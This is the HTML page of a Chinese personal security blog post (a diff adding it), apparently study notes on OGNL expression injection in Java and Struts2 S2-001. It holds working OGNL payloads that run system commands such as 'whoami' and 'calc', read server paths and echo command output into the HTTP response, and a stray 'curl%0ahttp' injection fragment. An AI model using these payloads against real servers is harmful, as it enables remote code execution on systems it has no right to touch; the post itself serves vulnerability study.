@@ -1,0 +1,665 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Mist","version":"7.8.0","exturl":false,"sidebar":{"position":"left","width":250,"display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":"default","style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":"ture","trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="ognl 表达式注入">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ognl">
+<meta property="og:url" content="http://example.com/2024/04/08/ognl/index.html">
+<meta property="og:site_name" content="blog">
+<meta property="og:description" content="ognl 表达式注入">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2024-04-08T07:58:17.000Z">
+<meta property="article:modified_time" content="2024-05-08T14:16:10.406Z">
+<meta property="article:author" content="小zhou">
+<meta property="article:tag" content="java">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="http://example.com/2024/04/08/ognl/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>ognl | blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2024/04/08/ognl/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/QQ%E5%9B%BE%E7%89%8720230109005650.jpg">
+      <meta itemprop="name" content="小zhou">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          ognl
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2024-04-08 15:58:17" itemprop="dateCreated datePublished" datetime="2024-04-08T15:58:17+08:00">2024-04-08</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2024-05-08 22:16:10" itemprop="dateModified" datetime="2024-05-08T22:16:10+08:00">2024-05-08</time>
+              </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>1.5k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>5 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p> ognl 表达式注入</p>
+<span id="more"></span>
+
+<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>java 漏洞</p>
+<p>RCE出现的原因和场景很多</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">服务端直接存在可执行函数（exec()等），且对传入的参数过滤不严格导致 RCE 漏洞</span><br><span class="line"></span><br><span class="line">服务端不直接存在可执行函数（exec()等），且对传入的参数过滤不严格导致 RCE 漏洞</span><br><span class="line"></span><br><span class="line">由表达式注入导致的RCE漏洞，常见的如：OGNL、SpEL、MVEL、EL、Fel、JST+EL等</span><br><span class="line"></span><br><span class="line">由java后端模板引擎注入导致的 RCE 漏洞，常见的如：Freemarker、Velocity、Thymeleaf等</span><br><span class="line"></span><br><span class="line">由java一些脚本语言引起的 RCE 漏洞，常见的如：Groovy、JavascriptEngine等</span><br><span class="line"></span><br><span class="line">由第三方开源组件引起的 RCE 漏洞，常见的如：Fastjson、Shiro、Xstream、Struts2、weblogic等</span><br></pre></td></tr></table></figure>
+
+<p>审计的时候可以重点寻找：</p>
+<ul>
+<li>Runtime.exec()</li>
+<li>Process</li>
+<li>ProcessBuilder.start()</li>
+</ul>
+<p>OGNL 全称Object-Graph Navigation Language即对象导航图语言，一种功能强大的表达式语言</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">存取对象的任意属性</span><br><span class="line">调用对象的方法</span><br><span class="line">遍历整个对象的结构图</span><br><span class="line">实现字段类型转化</span><br></pre></td></tr></table></figure>
+
+<p>webwork2 和 Struts2.x 中使用 OGNL 代替原来的 EL 来做界面数据绑定（就是把textfield.hidden和对象层某个类的某个属性绑定在一起，修改和现实自动同步）Struts2框架因为滥用OGNL表达式，所以漏洞较多。</p>
+<h1 id="OGNL表达式语法"><a href="#OGNL表达式语法" class="headerlink" title="OGNL表达式语法"></a>OGNL表达式语法</h1><p>OGNL getValue需要三元素：expression表达式、context上下文及root对象。那么什么是三元素：</p>
+<p>expression表达式：表达式是整个OGNL的核心，通过表达式来告诉OGNL需要执行什么操作；<br>root根对象：OGNL的Root对象可以理解为OGNL的操作对象。当OGNL通过表达式规定了“干什么”以后，还需要指定对谁进行操作；<br>context上下文对象：context以MAP的结构、利用键值对关系来描述对象中的属性以及值，称之为OgnlContext，可以理解为对象运行的上下文环境，其实就是规定OGNL的操作在哪里</p>
+<h2 id="符号的使用："><a href="#符号的使用：" class="headerlink" title="符号的使用："></a>符号的使用：</h2><p>OGNL表达式支持Java基本运算，所以运算符<code>+</code>、<code>-</code>、<code>*</code>、<code>/</code>、<code>%</code>等在OGNL都是支持的，另外还支持<code>in</code>、<code>eq</code>、<code>gt</code>等。</p>
+<p>%符</p>
+<p><code>%</code>符的用途是在标志的属性为字符串类型时，告诉执行环境%{}里的是OGNL表达式并计算表达式的值。</p>
+<p>除了基本运算符，<code>.</code>、<code>@</code>、<code>#</code>在OGNL中都有特殊含义。</p>
+<p>$符</p>
+<p><code>$</code>符的主要作用是在相关配置文件中引入OGNL表达式，让其在配置文件中也能解析OGNL表达式。（换句话说，$用于在配置文件中获取ValueStack的值用的）</p>
+<p>1、通过<code>.</code>获取对象的属性或方法：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">student</span><br><span class="line">student.name</span><br><span class="line">student.school</span><br><span class="line">student.school.name</span><br><span class="line">student.takingClasses(&quot;英语&quot;)</span><br></pre></td></tr></table></figure>
+
+<p>2、三种类型对象的获取：</p>
+<p>静态对象、静态方法和静态变量：<code>@</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">@java.lang.System@getProperty(&quot;user.dir&quot;)</span><br><span class="line">@java.lang.Math@abs(-111)</span><br></pre></td></tr></table></figure>
+
+<p><code>#</code>符主要有三种用途：</p>
+<ul>
+<li>访问非根对象属性，即访问OGNL上下文和Action上下文，由于Struts2中值栈被视为根对象，所以访问其他非根对象时需要加#前缀，#相当于<code>ActionContext.getContext()</code>；</li>
+<li>用于过滤和投影（projecting）集合，如<code>books.&#123;? #this.price&lt;100&#125;</code>；</li>
+<li>用于构造Map，如<code>#&#123;&#39;foo1&#39;:&#39;bar1&#39;, &#39;foo2&#39;:&#39;bar2&#39;&#125;</code>；</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#student.name</span><br><span class="line">#student.takingClasses(&quot;英语&quot;)</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="表达式注入漏洞"><a href="#表达式注入漏洞" class="headerlink" title="表达式注入漏洞"></a>表达式注入漏洞</h1><h2 id="ognl命令执行"><a href="#ognl命令执行" class="headerlink" title="ognl命令执行"></a>ognl命令执行</h2><p>导入 导入pom.xml</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>ognl<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>ognl<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.7.3<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">scope</span>&gt;</span>import<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>通过上面表达式的学习我们很容易能够写出Java执行命令的表达式：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> ognl.Ognl;</span><br><span class="line"><span class="keyword">import</span> ognl.OgnlContext;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// 创建一个OGNL上下文对象</span></span><br><span class="line">        <span class="type">OgnlContext</span> <span class="variable">context</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">OgnlContext</span>();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// getValue()   触发</span></span><br><span class="line">        <span class="comment">// @[类全名(包括包路径)]@[方法名|值名]</span></span><br><span class="line">        Ognl.getValue(<span class="string">&quot;@java.lang.Runtime@getRuntime().exec(&#x27;calc&#x27;)&quot;</span>, context, context.getRoot());</span><br><span class="line"></span><br><span class="line">        <span class="comment">// setValue()触发</span></span><br><span class="line"><span class="comment">//        Ognl.setValue(Runtime.getRuntime().exec(&quot;calc&quot;), context, context.getRoot());</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">@java.lang.Runtime@getRuntime().exec(&quot;calc&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//使用processbuilder执行系统命令</span><br><span class="line">(new java.lang.ProcessBuilder(new java.lang.String[]&#123;&quot;calc&quot;&#125;)).start()</span><br><span class="line"></span><br><span class="line">//获取当前路径</span><br><span class="line">@java.lang.System@getProperty(&quot;user.dir&quot;)</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="命令执行-调用链子分析"><a href="#命令执行-调用链子分析" class="headerlink" title="命令执行 调用链子分析"></a>命令执行 调用链子分析</h2><p>[OGNL表达式注入漏洞总结 <a target="_blank" rel="noopener" href="http://www.mi1k7ea.com/2020/03/16/OGNL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/#%E5%92%8C-%E5%92%8C-%E7%9A%84%E5%8C%BA%E5%88%AB"> Mi1k7ea ]</a></p>
+<h2 id="0x02-能解析OGNL的API"><a href="#0x02-能解析OGNL的API" class="headerlink" title="0x02 能解析OGNL的API"></a>0x02 能解析OGNL的API</h2><p>能解析OGNL的API如下表：</p>
+<table>
+<thead>
+<tr>
+<th align="left">类名</th>
+<th align="left">方法名</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">com.opensymphony.xwork2.util.TextParseUtil</td>
+<td align="left">translateVariables,translateVariablesCollection</td>
+</tr>
+<tr>
+<td align="left">com.opensymphony.xwork2.util.TextParser</td>
+<td align="left">evaluate</td>
+</tr>
+<tr>
+<td align="left">com.opensymphony.xwork2.util.OgnlTextParser</td>
+<td align="left">evaluate</td>
+</tr>
+<tr>
+<td align="left">com.opensymphony.xwork2.ognl.OgnlUtil</td>
+<td align="left">setProperties,setProperty,setValue,getValue,callMethod,compile</td>
+</tr>
+<tr>
+<td align="left">org.apache.struts2.util.VelocityStrutsUtil</td>
+<td align="left">evaluate</td>
+</tr>
+<tr>
+<td align="left">org.apache.struts2.util.StrutsUtil</td>
+<td align="left">isTrue,findString,findValue,getText,translateVariables,makeSelectList</td>
+</tr>
+<tr>
+<td align="left">org.apache.struts2.views.jsp.ui.OgnlTool</td>
+<td align="left">findValue</td>
+</tr>
+<tr>
+<td align="left">com.opensymphony.xwork2.util.ValueStack</td>
+<td align="left">findString,findValue,setValue,setParameter</td>
+</tr>
+<tr>
+<td align="left">com.opensymphony.xwork2.ognl.OgnlValueStack</td>
+<td align="left">findString,findValue,setValue,setParameter,trySetValue</td>
+</tr>
+<tr>
+<td align="left">ognl.Ognl</td>
+<td align="left">parseExpression,getValue,setValue</td>
+</tr>
+</tbody></table>
+<p>以下是调用过程中可能会涉及到的一些类：</p>
+<table>
+<thead>
+<tr>
+<th align="left">涉及类名</th>
+<th align="left">方法名</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">com.opensymphony.xwork2.ognl.OgnlReflectionProvider</td>
+<td align="left">getGetMethod,getSetMethod,getField,setProperties,setProperty,getValue,setValue</td>
+</tr>
+<tr>
+<td align="left">com.opensymphony.xwork2.util.reflection.ReflectionProvider</td>
+<td align="left">getGetMethod,getSetMethod,getField,setProperties,setProperty,getValue,setValue</td>
+</tr>
+</tbody></table>
+<h1 id="struct2-001"><a href="#struct2-001" class="headerlink" title="struct2-001"></a>struct2-001</h1><p>影响版本: 2.0.0 - 2.0.8</p>
+<p>payload 测试，然后返还2</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%&#123;1+1&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>payload ：如下</p>
+<p>获取tomcat执行路径：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%&#123;&quot;tomcatBinDir&#123;&quot;+@java.lang.System@getProperty(&quot;user.dir&quot;)+&quot;&#125;&quot;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>获取Web路径：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">%&#123;#req=@org.apache.struts2.ServletActionContext@getRequest(),</span><br><span class="line">#response=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;).getWriter(),</span><br><span class="line">#response.println(#req.getRealPath(&#x27;/&#x27;)),</span><br><span class="line">#response.flush(),</span><br><span class="line">#response.close()&#125;</span><br></pre></td></tr></table></figure>
+
+<p>添加了一些换行符这样就方便读懂一点</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">%&#123;#a=(new java.lang.ProcessBuilder(new java.lang.String[]&#123;&quot;whoami&quot;&#125;)).redirectErrorStream(true).start(),</span><br><span class="line">#b=#a.getInputStream(),</span><br><span class="line">#c=new java.io.InputStreamReader(#b),</span><br><span class="line">#d=new java.io.BufferedReader(#c),</span><br><span class="line">#e=new char[50000],</span><br><span class="line">#d.read(#e),</span><br><span class="line">#f=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;),</span><br><span class="line">#f.getWriter().println(new java.lang.String(#e)),</span><br><span class="line">#f.getWriter().flush(),</span><br><span class="line">#f.getWriter().close()&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="ognl-解析分析"><a href="#ognl-解析分析" class="headerlink" title="ognl 解析分析"></a>ognl 解析分析</h2><p>idea 远程调试</p>
+<p>首先使用p 神的环境进行搭建 并部署的 </p>
+<p>idea 动态调试</p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/ph4nt0mer/p/11772709.html">IDEA+docker，进行远程漏洞调试（weblogic） - ph4nt0mer - 博客园 (cnblogs.com)</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/haonan_code/article/details/118335032">idea远程调试tomcat的war包项目_idea调试war-CSDN博客</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/217482.html">Struts2基于OGNL的RCE漏洞全解析 - FreeBuf网络安全行业门户</a></p>
+<p><a target="_blank" rel="noopener" href="https://shu1l.github.io/2021/01/27/java-dai-ma-shen-ji-zhi-chang-jian-lou-dong-xue-xi/#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E">java代码审计之常见漏洞学习 - Shu1L’s blog</a></p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/10482#toc-1">一文读懂OGNL漏洞 - 先知社区 (aliyun.com)</a></p>
+<p><a target="_blank" rel="noopener" href="https://seaii-blog.com/2019/12/29/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/2019-12-29-Struts2%E6%BC%8F%E6%B4%9E%E8%B0%83%E8%AF%95%E7%AC%94%E8%AE%B0/">https://seaii-blog.com/2019/12/29/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/2019-12-29-Struts2%E6%BC%8F%E6%B4%9E%E8%B0%83%E8%AF%95%E7%AC%94%E8%AE%B0/</a></p>
+<p><a target="_blank" rel="noopener" href="https://chenlvtang.top/2022/08/11/Java%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E4%B9%8BOGNL/">Java表达式注入之OGNL | 沉铝汤的破站 (chenlvtang.top)</a></p>
+<p><a target="_blank" rel="noopener" href="https://seaii-blog.com/2019/12/29/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/2019-12-29-Struts2%E6%BC%8F%E6%B4%9E%E8%B0%83%E8%AF%95%E7%AC%94%E8%AE%B0/">https://seaii-blog.com/2019/12/29/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/2019-12-29-Struts2%E6%BC%8F%E6%B4%9E%E8%B0%83%E8%AF%95%E7%AC%94%E8%AE%B0/</a></p>
+<p>[OGNL表达式注入漏洞总结 <a target="_blank" rel="noopener" href="http://www.mi1k7ea.com/2020/03/16/OGNL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/#0x01-OGNL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%9F%BA%E7%A1%80"> Mi1k7ea ]</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/suyu7/p/14918851.html">IDEA+docker，进行远程漏洞调试（weblogic） - 唐小风 - 博客园 (cnblogs.com)</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/246100">Struts2-001 远程代码执行漏洞浅析-安全客 - 安全资讯平台 (anquanke.com)</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/haonan_code/article/details/118335032">idea远程调试tomcat的war包项目_idea 调试tomcat-CSDN博客</a></p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/12814?time__1311=mqmhq+xfhD7YDs=Y4Cq4iTqxjhVf8feD&alichlgref=https://cn.bing.com/">Java漏洞调试—利用Vulhub一键进行docker远程调试 - 先知社区 (aliyun.com)</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl%0ahttp</span><br></pre></td></tr></table></figure>
+
+
+    </div>
+
+    
+    
+    
+        <div class="reward-container">
+  <div>三天饿九顿，讨点饭吃。</div>
+  <button onclick="var qr = document.getElementById('qr'); qr.style.display = (qr.style.display === 'none') ? 'block' : 'none';">
+    打赏
+  </button>
+  <div id="qr" style="display: none;">
+      
+      <div style="display: inline-block;">
+        <img src="https://s3.bmp.ovh/imgs/2024/03/14/21b16ab18c2680bb.png" alt="小zhou 微信支付">
+        <p>微信支付</p>
+      </div>
+      
+      <div style="display: inline-block;">
+        <img src="https://s3.bmp.ovh/imgs/2024/03/14/d41c13eba802dd0b.png" alt="小zhou 支付宝">
+        <p>支付宝</p>
+      </div>
+
+  </div>
+</div>
+
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/java/" rel="tag"># java</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2024/04/05/pwn%E5%85%A5%E9%97%A8/" rel="prev" title="pwn入门">
+      <i class="fa fa-chevron-left"></i> pwn入门
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2024/04/09/%E6%A0%BC%E5%9F%BA%E8%A7%84%E7%BA%A6%E7%AE%97%E6%B3%95/" rel="next" title="格基规约算法">
+      格基规约算法 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#OGNL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E8%AF%AD%E6%B3%95"><span class="nav-number">2.</span> <span class="nav-text">OGNL表达式语法</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AC%A6%E5%8F%B7%E7%9A%84%E4%BD%BF%E7%94%A8%EF%BC%9A"><span class="nav-number">2.1.</span> <span class="nav-text">符号的使用：</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E"><span class="nav-number">3.</span> <span class="nav-text">表达式注入漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#ognl%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="nav-number">3.1.</span> <span class="nav-text">ognl命令执行</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" 